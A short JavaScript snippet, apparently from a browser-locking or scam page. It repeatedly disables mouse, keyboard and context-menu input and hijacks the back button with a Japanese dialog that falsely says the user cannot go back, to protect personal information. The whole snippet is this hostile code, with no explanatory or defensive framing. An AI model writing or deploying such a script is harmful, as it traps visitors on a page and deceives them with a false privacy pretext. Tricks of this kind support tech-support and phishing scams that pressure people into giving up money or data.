setInterval(() => {
    document.ondblclick = function () {return false;}
    document.onmousedown = function () {return false;}
    document.onmouseup = function () {return false;}
    document.oncontextmenu = function () {return false;}
    document.onkeydown = function () {return false;}
    document.onkeyup = function () {return false;}
  }, 1);

  history.pushState(null, null, location.href);
  window.addEventListener('popstate', (e) => {
    confirm("個人情報保護のため戻れません。")
    history.go(1);
  });

  window.addEventListener('beforeunload', function(e) {
}, false);
